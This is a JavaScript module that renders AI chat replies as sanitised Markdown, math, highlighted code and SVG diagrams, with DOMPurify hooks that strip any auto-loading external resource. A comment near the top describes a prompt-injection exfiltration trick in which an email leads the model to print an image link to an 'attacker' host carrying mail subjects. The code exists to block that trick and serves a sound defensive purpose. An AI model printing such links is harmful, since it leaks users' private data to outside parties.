// Markdown + LaTeX + code highlighting for model replies. All bundled locally (works offline).
import { Marked } from 'marked';
import markedKatex from 'marked-katex-extension';
import { markedHighlight } from 'marked-highlight';
import DOMPurify from 'dompurify';
import hljs from 'highlight.js/lib/core';
import javascript from 'highlight.js/lib/languages/javascript';
import typescript from 'highlight.js/lib/languages/typescript';
import python from 'highlight.js/lib/languages/python';
import rust from 'highlight.js/lib/languages/rust';
import json from 'highlight.js/lib/languages/json';
import bash from 'highlight.js/lib/languages/bash';
import powershell from 'highlight.js/lib/languages/powershell';
import css from 'highlight.js/lib/languages/css';
import xml from 'highlight.js/lib/languages/xml';
import sql from 'highlight.js/lib/languages/sql';
import cpp from 'highlight.js/lib/languages/cpp';
import java from 'highlight.js/lib/languages/java';
import yaml from 'highlight.js/lib/languages/yaml';
import markdown from 'highlight.js/lib/languages/markdown';
import 'katex/dist/katex.min.css';

// A reply is drawn the moment it arrives, so anything in it that loads by itself (an image, a video poster, a background, a style)
// would send a request with no tool call and no approval: a mail could ask for ![](https://attacker/?q=<subjects>) and the model
// might print it. This sanitiser (its own instance, so other users of DOMPurify are untouched) keeps only data: and blob: sources;
// links stay links, since following one is the person's own click.
const purify = DOMPurify(window);
const LOCAL_SRC = /^\s*(data:|blob:)/i;
const URL_ATTRS = ['fill', 'stroke', 'filter', 'clip-path', 'mask', 'marker-start', 'marker-mid', 'marker-end', 'cursor'];
const OUTSIDE_URL = /url\s*\(\s*['"]?\s*(?!#)/i;
const SRC_ATTRS = ['src', 'srcset', 'poster', 'background', 'lowsrc', 'dynsrc', 'data', 'codebase', 'action', 'formaction'];
purify.addHook('afterSanitizeAttributes', (node) => {
  for (const a of SRC_ATTRS) { const v = node.getAttribute?.(a); if (v != null && (a === 'srcset' || !LOCAL_SRC.test(v))) node.removeAttribute(a); }
  node.removeAttribute?.('ping');
  // SVG pulls in other documents with href on image, use and feImage; only same-document references (#id) stay
  if (/^(image|use|feimage)$/i.test(node.nodeName)) for (const a of ['href', 'xlink:href']) { const v = node.getAttribute(a); if (v != null && !/^\s*#/.test(v)) node.removeAttribute(a); }
  for (const a of URL_ATTRS) { const v = node.getAttribute?.(a); if (v != null && (OUTSIDE_URL.test(v) || v.includes('\\'))) node.removeAttribute(a); } // fill="url(https://...)" and the like: only url(#id) stays; a CSS escape could spell url
  // A style keeps only colour and length functions; anything else with a ( (url, image-set, any image function) or a CSS escape (\75 rl)
  // could load something, so the whole attribute goes (R1-2)
  const style = node.getAttribute?.('style');
  if (style) {
    let rest = style;
    for (let i = 0; i < 3; i++) rest = rest.replace(/\b(?:rgba?|hsla?|calc|var|min|max|clamp)\(\s*[-\w.,%\s#+*/]*\)/gi, '');
    if (/[(\\]/.test(rest)) node.removeAttribute('style');
  }
});
const PURIFY = { ADD_ATTR: ['target'], FORBID_TAGS: ['style', 'link', 'meta', 'base'] };
// A diagram the model drew: the SVG profile, and nothing that runs, restyles the page or reaches another document (on* attributes are
// removed by DOMPurify itself; external hrefs and url() by the hook above).
const DIAGRAM = { USE_PROFILES: { svg: true, svgFilters: true }, FORBID_TAGS: ['script', 'style', 'foreignObject', 'animate', 'animateMotion', 'animateTransform', 'set', 'link', 'meta', 'base'] };

Object.entries({
  javascript, typescript, python, rust, json, bash, powershell, css, xml, sql, cpp, java, yaml, markdown,
}).forEach(([name, lang]) => hljs.registerLanguage(name, lang));
hljs.registerAliases(['js'], { languageName: 'javascript' });
hljs.registerAliases(['ts'], { languageName: 'typescript' });
hljs.registerAliases(['py'], { languageName: 'python' });
hljs.registerAliases(['rs'], { languageName: 'rust' });
hljs.registerAliases(['sh', 'shell', 'zsh'], { languageName: 'bash' });
hljs.registerAliases(['ps1'], { languageName: 'powershell' });
hljs.registerAliases(['html'], { languageName: 'xml' });
hljs.registerAliases(['c', 'h', 'hpp'], { languageName: 'cpp' });
hljs.registerAliases(['yml'], { languageName: 'yaml' });
hljs.registerAliases(['md'], { languageName: 'markdown' });

const escapeHtml = (t) => t.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// Highlighted HTML for a code string (used by code blocks and the artifact source view).
export function highlightCode(code, lang) {
  return hljs.getLanguage(lang) ? hljs.highlight(code, { language: lang }).value : hljs.highlightAuto(code).value;
}

const marked = new Marked(
  markedHighlight({
    emptyLangClass: 'hljs',
    langPrefix: 'hljs language-',
    highlight: highlightCode,
  }),
  markedKatex({ throwOnError: false, nonStandard: true }),
  {
    gfm: true,
    breaks: false,
    // Code blocks get a header (language + copy button). Highlighting already ran, so `text` is HTML.
    renderer: {
      code({ text, lang }) {
        const name = escapeHtml((lang || '').split(/\s/)[0]);
        return `<div class="code-box"><div class="code-head"><span>${name || 'code'}</span><button type="button" class="copy-btn">Copy</button></div><pre><code class="hljs language-${name}">${text}</code></pre></div>`;
      },
    },
  },
);

// Models often write math as \( ... \) and \[ ... \]; convert to $ / $$ outside code.
function normaliseMath(text) {
  return text
    .split(/(```[\s\S]*?(?:```|$)|`[^`\n]*`)/g)
    .map((part, i) => (i % 2 ? part : part
      .replace(/\\\[([\s\S]+?)\\\]/g, (_, m) => `\n$$${m}$$\n`)
      .replace(/\\\(([\s\S]+?)\\\)/g, (_, m) => `$${m}$`)))
    .join('');
}

// ---- diagrams ---------------------------------------------------------------------------------------------------------------
// A fenced block tagged "svg" is drawn as a diagram. While it streams it is only a placeholder: the SVG is drawn once its closing fence
// has arrived, never half written. What the model sends is untrusted: it must parse as XML, is sanitised, and is put in the page as inline
// SVG (no iframe, no eval) scaled to the bubble's width from its viewBox. Anything that fails shows the code with a small note.
const isSvgFence = (t) => t.type === 'code' && /^svg$/i.test((t.lang ?? '').split(/\s/)[0]);
function fenceClosed(raw) {
  const lines = raw.replace(/\s+$/, '').split('\n');
  const open = /^ {0,3}(`{3,}|~{3,})/.exec(lines[0]);
  const close = lines.length > 1 && /^ {0,3}(`{3,}|~{3,})\s*$/.exec(lines.at(-1));
  return !!open && !!close && close[1][0] === open[1][0] && close[1].length >= open[1].length;
}
const PENDING_DIAGRAM = '<div class="diagram-pending" role="status">drawing diagram...</div>';
const DIAGRAM_FAILED = '<p class="diagram-note">diagram failed to render</p>';
function diagramHtml(source) {
  try {
    const doc = new DOMParser().parseFromString(source, 'image/svg+xml');
    if (doc.querySelector('parsererror') || doc.documentElement.localName !== 'svg') return null;
    const tpl = document.createElement('template');
    tpl.innerHTML = purify.sanitize(source, DIAGRAM);
    const svg = tpl.content.querySelector('svg');
    if (!svg) return null;
    for (const e of svg.querySelectorAll('*')) { // a diagram carries no links at all: only references inside the document (#id) stay
      for (const n of ['href', 'xlink:href']) if (e.hasAttribute(n) && !/^s*#/.test(e.getAttribute(n))) e.removeAttribute(n);
      e.removeAttribute('target');
    }
    let box = svg.getAttribute('viewBox');
    if (!box) { // no viewBox: made from a plain width and height, else it cannot be scaled
      const w = parseFloat(svg.getAttribute('width')), h = parseFloat(svg.getAttribute('height'));
      if (!(w > 0 && h > 0)) return null;
      box = `0 0 ${w} ${h}`;
      svg.setAttribute('viewBox', box);
    }
    const n = box.trim().split(/[\s,]+/).map(Number);
    if (n.length !== 4 || n.some((x) => !Number.isFinite(x)) || !(n[2] > 0 && n[3] > 0)) return null;
    svg.setAttribute('width', '100%');
    svg.removeAttribute('height');
    const label = svg.querySelector('title')?.textContent.trim().slice(0, 120) || 'Diagram';
    return `<figure class="diagram" role="img" aria-label="${escapeHtml(label)}">${svg.outerHTML}</figure>`;
  } catch { return null; }
}
function plainBlock(t) {
  const one = [t];
  if (marked.defaults.walkTokens) marked.walkTokens(one, marked.defaults.walkTokens); // the code highlighter hooks in here
  return purify.sanitize(marked.parser(one), PURIFY);
}

// A reply is drawn again on every paint while it streams, but all of it except the last block is the same as
// the paint before. So it is rendered block by block (a block is a paragraph, a list, a code fence, a table...)
// and each block's finished, sanitised HTML is remembered: only the block still being written is worked out again.
const blocks = new Map();
const BLOCK_CACHE = 600;
// The same, as a list: one entry per block, so a caller can tell which blocks did not change (chat-ui.js).
export function renderBlocks(text) {
  const tokens = marked.lexer(normaliseMath(text));
  const list = [];
  for (const t of tokens) {
    if (t.type === 'space') continue;
    if (isSvgFence(t) && !fenceClosed(t.raw)) { list.push(PENDING_DIAGRAM); continue; } // still being written: not cached, not drawn
    const key = `${t.type}\u0000${t.raw}`;
    let part = blocks.get(key);
    if (part === undefined) {
      part = isSvgFence(t) ? (diagramHtml(t.text) ?? `${plainBlock(t)}${DIAGRAM_FAILED}`) : plainBlock(t);
      if (blocks.size >= BLOCK_CACHE) blocks.delete(blocks.keys().next().value);
      blocks.set(key, part);
    }
    list.push(part);
  }
  return list;
}
export const renderMarkdown = (text) => renderBlocks(text).join('');
